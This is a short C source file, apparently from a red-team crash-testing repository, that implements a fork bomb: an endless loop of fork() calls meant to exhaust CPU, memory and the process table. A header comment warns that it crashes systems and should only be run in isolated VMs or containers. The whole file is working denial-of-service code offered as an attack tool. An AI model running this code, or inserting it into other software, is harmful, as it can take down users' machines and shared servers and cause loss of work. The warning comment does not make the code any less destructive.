/*
 * Fork Bomb in C
 * ---------------
 * WARNING: This will crash your system if run outside a VM/container.
 * ONLY test in isolated environments (e.g., VMs, Docker with resource limits).
 *
 * How it works:
 * - Uses `fork()` to recursively create child processes.
 * - Exhausts system resources (CPU, memory, process table).
 *
 * Author: Aryan Giri
 * Repo: https://github.com/giriaryan694-a11y/RedTeamCrashKit
 */

#include <unistd.h>  // for fork()

int main() {
    while (1) {
        fork();  // Create a new process indefinitely
    }
    return 0;
}